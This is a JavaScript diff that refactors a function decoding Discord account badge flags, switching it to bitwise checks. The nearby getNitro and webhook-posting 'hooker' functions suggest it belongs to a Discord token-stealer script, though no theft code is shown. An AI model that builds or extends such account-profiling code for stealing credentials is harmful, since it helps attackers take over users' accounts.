@@ -582,67 +582,51 @@ const getNitro = (flags) => {
 };
 
 const getBadges = (flags) => {
-    const badges = [];
-    
-    if (flags == 4194304) {
-        badges.push('Active Developer')
-        flags -= 4194304
-    }
-    if (flags == 262144) {
-        badges.push('Moderator Programs Alumni')
-        flags -= 262144
-    }
-    if (flags == 131072) {
-        badges.push('Early Verified Bot Developer')
-        flags -= 131072
-    }
-    if (flags == 16384) {
-        badges.push('Discord Bug Hunter (Golden)')
-        flags -= 16384
-    }
-    if (flags == 512) {
-        badges.push('Early Supporter')
-        flags -= 512
-    }
-    if (flags == 256) {
-        badges.push('HypeSquad Balance')
-        flags -= 256
-    }
-    if (flags == 128) {
-        badges.push('HypeSquad Brilliance')
-        flags -= 128
-    }
-    if (flags == 64) {
-        badges.push('HypeSquad Bravery')
-        flags -= 64
-    }
-    if (flags == 8) {
-        badges.push('Discord Bug Hunter (Normal)')
-        flags -= 8
-    }
-    if (flags == 4) {
-        badges.push('HypeSquad Event')
-        flags -= 4
-    }
-    if (flags == 2) {
-        badges.push('Partnered Server Owner')
-        flags -= 2
-    }
-    if (flags == 1) {
-        badges.push('Discord Staff')
-        flags -= 1
-    }
-    
-    if (flags == 0) {
-        if (badges.length == 0) {
-            badges.push('None')
-        }
-    } else {
-        badges.push('(Unknown)')
-    }
-    
+  const badges = [];
+  
+  if (flags & (1 << 22)) {
+      badges.push('Active Developer')
+  }
+  if (flags & (1 << 18)) {
+      badges.push('Moderator Programs Alumni')
+  }
+  if (flags & (1 << 17)) {
+      badges.push('Early Verified Bot Developer')
+  }
+  if (flags & (1 << 14)) {
+      badges.push('Discord Bug Hunter (Golden)')
+  }
+  if (flags & (1 << 9)) {
+      badges.push('Early Supporter')
+  }
+  if (flags & (1 << 8)) {
+      badges.push('HypeSquad Balance')
+  }
+  if (flags & (1 << 7)) {
+      badges.push('HypeSquad Brilliance')
+  }
+  if (flags & (1 << 6)) {
+      badges.push('HypeSquad Bravery')
+  }
+  if (flags & (1 << 3)) {
+      badges.push('Discord Bug Hunter (Normal)')
+  }
+  if (flags & (1 << 2)) {
+      badges.push('HypeSquad Event')
+  }
+  if (flags & (1 << 1)) {
+      badges.push('Partnered Server Owner')
+  }
+  if (flags & (1 << 0)) {
+      badges.push('Discord Staff')
+  }
+  
+  if (!badges.length) {
+    return "None"
+  } else {
     return badges.join(', ');
-  };
+  }
+};
 
 const hooker = async (content) => {
   const data = JSON.stringify(content);
